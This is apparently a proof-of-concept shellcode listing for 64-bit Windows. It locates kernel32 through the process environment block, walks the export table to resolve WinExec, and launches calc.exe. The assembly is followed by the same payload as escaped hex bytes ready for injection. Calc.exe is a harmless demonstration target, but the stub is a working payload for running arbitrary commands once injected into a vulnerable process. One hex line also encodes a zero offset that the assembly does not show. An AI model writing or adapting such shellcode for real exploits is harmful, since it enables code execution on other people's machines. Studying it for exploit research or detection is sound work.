cdq 
mov rax,qword ptr gs:[rdx+60]
mov rax,qword ptr ds:[rax+18]
mov rsi,qword ptr ds:[rax+10]
lodsq 
mov rsi,qword ptr ds:[rax]
mov rdi,qword ptr ds:[rsi+30]
xor rbx,rbx
xor rsi,rsi
mov ebx,dword ptr ds:[rdi+0x3c]   ; get value e_lfanew from Dos header
add rbx,rdi                     ; rbx = NT_Header_64
mov dl,0x88                       ; offset to data directory[export table]
mov ebx,dword ptr ds:[rbx+rdx]  ; get RVA of export table
add rbx,rdi                     ; rbx = Export Table
mov esi, dword ptr ds:[rbx+0x20]  ; get RVA of AddressOfNames
add rsi, rdi
cdq
xor rcx,rcx
loop:
    mov eax, dword ptr [rsi] ; RVA to a function name
    add rax, rdi             ; VA to function name
    cmp dword ptr [rax], 'EniW'
    jnz NoP
    jmp EWF
NoP:
    add rsi,0x4
    inc rcx
    jmp loop
EWF:
    rol rcx, 1
    mov esi, dword ptr ds:[rbx+0x24]  ; RVA to AddressOfNameOrdinals
    add rsi, rdi                    ; VA to AddressOfNameOrdinals
    cdq
    add rsi, rcx
    movzx rcx, word ptr [rsi]       ; Offset to the function address

    mov esi,dword ptr ds:[rbx+0x1C]   ; RVA to AddressOfFunctions
    add rsi,rdi                     ; VA to AddressOfFunctions
    cdq 
    rol rcx,0x2                       ; kernel32 pointers == 4 bytes
    add rsi, rcx
    mov eax, dword ptr ds:[rsi]     ; get the address of the function
    add rax, rdi
    cdq


jmp name
call_win_exec:
pop rcx
cdq 
inc rdx
call rax
name:
call call_win_exec
db  'calc.exe',0

;=================================================
; "\x99\x65\x48\x8B\x42\x60\x48\x8B\x40\x18\x48\x8B\x70\x10\x48\xAD\x48\x8B\x30\x48\x8B\x7E\x30\x48\x31\xDB\x48\x31\xF6"
; "\x8B\x5F\x3C\x48\x01\xFB\xB2\x88\x8B\x1C\x13\x48\x01\xFB\x8B\x73\x20\x48\x01\xFE\x99\x48\x31\xC9"
; "\x8B\x86\x00\x00\x00\x00\x48\x01\xF8\x81\x38\x57\x69\x6E\x45\x75\x02\xEB\x09\x48\x83\xC6\x04\x48\xFF\xC1\xEB\xE4\x48\xD1\xC1\x8B\x73\x24\x48\x01\xFE\x99\x48\x01\xCE\x48\x0F\xB7\x0E\x8B\x73\x1C\x48\x01\xFE\x99\x48\xC1\xC1\x02\x48\x01\xCE\x8B\x06\x48\x01\xF8\x99"
; "\xEB\x07\x59\x99\x48\xFF\xC2\xFF\xD0\xE8\xF4\xFF\xFF\xFFcalc.exe\x00"